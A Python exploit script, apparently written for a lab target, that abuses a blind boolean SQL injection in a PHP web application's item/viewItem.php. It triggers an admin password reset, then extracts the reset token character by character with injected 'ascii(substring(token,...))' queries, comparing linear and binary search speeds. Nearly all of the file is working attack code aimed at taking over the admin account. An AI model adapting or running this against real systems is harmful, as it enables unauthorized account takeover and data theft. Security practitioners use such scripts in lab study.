# SQL Injection at item/viewItem.php on line 18

# If the string is true, the request will return 404, if it's false it will return 302

# This code was made to test the efficiency of binary injection on SQL Injection.

import urllib3
import sys
import requests
import urllib
import time
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = 'http://192.168.1.128/item/viewItem.php?id='

def sendResetToken():

    print("[+] Reset password sent")
    # Sending password reset
    sendResetURL = 'http://192.168.1.128/login/resetPassword.php'

    d = {'username':'admin'}

    requests.post(sendResetURL, verify=False, proxies=proxies, data=d)

def binaryInjection(url, first, last):

    global countRequests 

    if last >= first:

        middleElement = (first + last) // 2

        payload = "4 AND (select ascii(substring(token,%s,1)) from user where id=1) = %s;" % (i, middleElement)
        payload_encoded = urllib.parse.quote(payload)
        finalURL = url + payload_encoded
        r = requests.get(finalURL, verify=False, proxies=proxies, allow_redirects=False)
        countRequests += 1 

        if r.status_code != 302:
            # token += chr(middleElement)
            # sys.stdout.write('\r' + token)
            sys.stdout.flush()
            return chr(middleElement) # Move on to the next character in the token

        payload = "4 AND (select ascii(substring(token,%s,1)) from user where id=1) < %s;" % (i, middleElement)
        payload_encoded = urllib.parse.quote(payload)
        finalURL = url + payload_encoded
        r = requests.get(finalURL, verify=False, proxies=proxies, allow_redirects=False)
        countRequests += 1 

        if r.status_code != 302:
            newPosition = middleElement - 1
            # sys.stdout.write('\r' + token)
            sys.stdout.flush()
            return binaryInjection(url, first, newPosition)
        
        payload = "4 AND (select ascii(substring(token,%s,1)) from user where id=1) > %s;" % (i, middleElement)
        payload_encoded = urllib.parse.quote(payload)
        finalURL = url + payload_encoded
        r = requests.get(finalURL, verify=False, proxies=proxies, allow_redirects=False)
        countRequests += 1 

        if r.status_code != 302:
            newPosition = middleElement + 1       
            # sys.stdout.write('\r' + token)
            sys.stdout.flush()
            return binaryInjection(url, newPosition, last)

        # If response is 302, this is not the character
        if r.status_code == 302:
            # sys.stdout.write('\r' + token + chr(j))
            sys.stdout.flush()

    else:
        return
    
def injection(url):

    global countRequests
    token = ""
    
    # print("[+] Finding token...")

    # Loop through each position in the token (we known the length by checking generateToken())
    for i in range(1, 16):

        # Loop through ASCII values of printable characters (48 to 122) - https://theasciicode.com.ar/
        for j in range(48, 123):

            # Construct SQL injection payload
            # You have to compare the character in ascii decimal value
            payload = "4 AND (select ascii(substring(token,%s,1)) from user where id=1) = %s;" % (i, j)

            payload_encoded = urllib.parse.quote(payload)

            finalURL = url + payload_encoded

            # print(finalURL)
            
            r = requests.get(finalURL, verify=False, proxies=proxies, allow_redirects=False)
            countRequests += 1 
            
            # If response is 302, this is not the character
            if r.status_code == 302:
                sys.stdout.write('\r' + token + chr(j))
                sys.stdout.flush()
            else:
                token += chr(j)
                sys.stdout.write('\r' + token)
                sys.stdout.flush()
                break  # Move on to the next character in the token

    sys.stdout.write('\r')
    print("[+] Token found:", token)
    return token

# First we send the reset to generate the token
sendResetToken()

print("")
print("[+] Normal search injection")

start = time.time()

countRequests = 0
injection(url)

end = time.time()
print("[!] Elapsed time:", end - start)
print("[!] Count of requests:", countRequests)

print("")
# sendResetToken()

print("[+] Binary search injection")

start = time.time()

first = 48
last = 122
token = ""
countRequests = 0

# Loop through each position in the token (we known the length by checking generateToken())
for i in range(1, 16):
    token += binaryInjection(url, first, last)

print("[+] Token found:", token)

end = time.time()
print("[!] Elapsed time:", end - start)
print("[!] Count of requests:", countRequests)

